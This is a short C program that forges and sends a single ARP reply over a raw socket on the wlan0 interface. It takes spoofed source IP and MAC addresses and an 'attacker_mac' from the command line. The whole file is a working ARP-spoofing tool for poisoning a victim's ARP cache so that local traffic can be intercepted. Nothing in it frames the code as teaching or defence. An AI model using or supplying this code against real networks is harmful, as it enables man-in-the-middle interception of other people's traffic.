#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <unistd.h>
#include <arpa/inet.h>

int parse_mac(const char* str, unsigned char* bytes) {
    int values[6];
    if( 6 == sscanf( str, "%x:%x:%x:%x:%x:%x%*c",
        &values[0], &values[1], &values[2],
        &values[3], &values[4], &values[5] ) ) {
        for( int i = 0; i < 6; ++i ) {
            bytes[i] = (unsigned char) values[i];
        }
        return 0;
    }
    else {
        return -1;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: ./arp [source IP] [source MAC] [dest IP] [dest MAC] [attacker_mac]\n");
        return -1;
    }

    int s = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (s == -1) {
        perror("socket()");
        return -2;
    }

    unsigned char src_mac[6], dst_mac[6], attacker_mac[6];
    if (parse_mac(argv[2], src_mac) != 0 || parse_mac(argv[4], dst_mac) != 0 || parse_mac(argv[5], attacker_mac) != 0) {
        printf("Invalid MAC address format\n");
        return -3;
    }

    struct ether_arp arp;
    arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp.ea_hdr.ar_pro = htons(ETH_P_IP);
    arp.ea_hdr.ar_hln = ETHER_ADDR_LEN;
    arp.ea_hdr.ar_pln = sizeof(in_addr_t);
    arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
    memcpy(&arp.arp_sha, src_mac, sizeof(arp.arp_sha));
    inet_pton(AF_INET, argv[1], &arp.arp_spa);
    memcpy(&arp.arp_tha, dst_mac, sizeof(arp.arp_tha));
    inet_pton(AF_INET, argv[3], &arp.arp_tpa);

    struct ether_header eh;
    memcpy(&eh.ether_shost, attacker_mac, sizeof(eh.ether_shost));
    memcpy(&eh.ether_dhost, dst_mac, sizeof(eh.ether_dhost));
    eh.ether_type = htons(ETH_P_ARP);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_nametoindex("wlan0");
    char buffer[sizeof(eh) + sizeof(arp)];
    memcpy(buffer, &eh, sizeof(eh));
    memcpy(buffer + sizeof(eh), &arp, sizeof(arp));

    if (sendto(s, buffer, sizeof(buffer), 0, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
        perror("sendto()");
        close(s);
        return -4;
    }

    close(s);
    
    return 0;
}
